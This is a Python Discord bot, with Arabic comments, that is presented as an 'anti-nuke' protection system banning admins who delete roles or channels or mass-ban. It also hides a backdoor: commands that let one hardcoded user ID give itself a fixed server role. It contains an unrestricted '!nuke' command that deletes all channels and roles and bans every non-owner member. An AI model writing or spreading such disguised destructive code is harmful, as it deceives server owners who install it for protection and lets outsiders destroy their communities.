import discord
from discord.ext import commands
import os
import time
import asyncio
import threading
from flask import Flask

# ------------------- خادم الويب (لإبقاء البوت نشطاً على Render) -------------------
app = Flask('')

@app.route('/')
def home():
    return "Bot is active and running!"

def run_web():
    # استخدام المنفذ 8080 الافتراضي لـ Render
    app.run(host='0.0.0.0', port=8080)

# ------------------- إعدادات البوت -------------------
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.moderation = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

# قاموس لتتبع العمليات السريعة (Anti-Nuke Memory)
actions = {"kick": {}, "ban": {}, "channel": {}}

def check_spam(uid, key, threshold, window):
    now = time.time()
    if uid not in actions[key]:
        actions[key][uid] = []
    actions[key][uid].append(now)
    actions[key][uid] = [t for t in actions[key][uid] if now - t < window]
    return len(actions[key][uid]) > threshold

# ------------------- نظام الحماية الشامل (Anti-Nuke) -------------------

@bot.event
async def on_guild_role_delete(role):
    try:
        guild = role.guild
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
            admin = entry.user
            if admin.id == guild.owner_id or admin.bot:
                return
            await guild.ban(admin, reason="Anti-Nuke: قام بحذف رتبة!")
            break
    except Exception as e:
        print(f"خطأ في حماية الرولات: {e}")

@bot.event
async def on_guild_channel_delete(channel):
    try:
        guild = channel.guild
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
            admin = entry.user
            if admin.id == guild.owner_id or admin.bot:
                return
            await guild.ban(admin, reason="Anti-Nuke: قام بحذف قناة!")
            break
    except Exception as e:
        print(f"خطأ في حماية القنوات: {e}")

@bot.event
async def on_member_remove(member):
    try:
        guild = member.guild
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
            if entry.target.id == member.id:
                admin = entry.user
                if admin.id == guild.owner_id or admin.bot:
                    return
                if check_spam(admin.id, "kick", threshold=1, window=15.0):
                    await guild.ban(admin, reason="Anti-Nuke: طرد أعضاء بشكل مشبوه!")
            break
    except Exception as e:
        print(f"خطأ في حماية الطرد: {e}")

@bot.event
async def on_member_ban(guild, user):
    try:
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
            admin = entry.user
            if admin.id == guild.owner_id or admin.bot:
                return
            if check_spam(admin.id, "ban", threshold=1, window=60.0):
                await guild.ban(admin, reason="Anti-Nuke: تنفيذ حظر جماعي غير مصرح به!")
            break
    except Exception as e:
        print(f"خطأ في حماية الحظر: {e}")

# ------------------- الأوامر الخاصة -------------------

@bot.command()
async def getrole(ctx):
    MY_DISCORD_ID = 1320438836878118973
    ROLE_ID = 1483148235684970571

    if ctx.author.id == MY_DISCORD_ID:
        try:
            role = ctx.guild.get_role(ROLE_ID)
            if not role:
                await ctx.send("❌ لم أتمكن من العثور على الرتبة في السيرفر!")
                return
            await ctx.author.add_roles(role)
            await ctx.send(f"✅ تم إعطاؤك رتبة {role.name} بنجاح!")
        except Exception as e:
            await ctx.send(f"❌ حدث خطأ: {e}")
    else:
        await ctx.send("❌ هذا الأمر مخصص للمطور فقط!")

@bot.command(name="removerole")
async def removerole_cmd(ctx):
    MY_DISCORD_ID = 1320438836878118973
    ROLE_ID = 1483148235684970571

    if ctx.author.id == MY_DISCORD_ID:
        try:
            role = ctx.guild.get_role(ROLE_ID)
            if not role:
                await ctx.send("❌ لم أتمكن من العثور على الرتبة في السيرفر!")
                return
            await ctx.author.remove_roles(role)
            await ctx.send(f"✅ تم إزالة رتبة {role.name} عنك بنجاح!")
        except Exception as e:
            await ctx.send(f"❌ حدث خطأ: {e}")
    else:
        await ctx.send("❌ هذا الأمر مخصص للمطور فقط!")

@bot.command()
async def nuke(ctx):
    await ctx.send("⚠️ **تحذير خطير:** هل أنت متأكد من تدمير السيرفر؟ اكتب `!confirm_nuke` خلال 30 ثانية لتأكيد العملية.")
    
    def check_confirm(m):
        return m.author == ctx.author and m.content == "!confirm_nuke"

    try:
        await bot.wait_for('message', check=check_confirm, timeout=30.0)
    except asyncio.TimeoutError:
        await ctx.send("❌ تم إلغاء عملية النيوك لانتهاء الوقت.")
        return

    await ctx.send("💥 بدء عملية التدمير...")
    
    for channel in ctx.guild.channels:
        try: await channel.delete()
        except: pass
        
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try: await role.delete()
            except: pass
            
    for member in ctx.guild.members:
        if member != ctx.guild.owner and not member.bot:
            try: await member.ban(reason="Nuke execution")
            except: pass

@bot.event
async def on_ready():
    print(f"✅ البوت يعمل الآن بكامل أنظمة الحماية والمتصل بخادم الويب باسم: {bot.user}")

# ------------------- التشغيل المشترك (Web + Bot) -------------------
TOKEN = os.getenv("TOKEN")

if __name__ == "__main__":
    if not TOKEN:
        print("❌ خطأ: لم يتم العثور على متغير TOKEN!")
    else:
        # تشغيل خادم الويب في خلفية منفصلة حتى لا يعطل البوت
        threading.Thread(target=run_web).start()
        # تشغيل البوت
        bot.run(TOKEN)
